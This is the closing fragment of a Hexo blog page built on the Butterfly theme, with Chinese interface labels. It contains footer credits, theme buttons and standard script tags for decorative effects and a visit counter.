class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="true"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
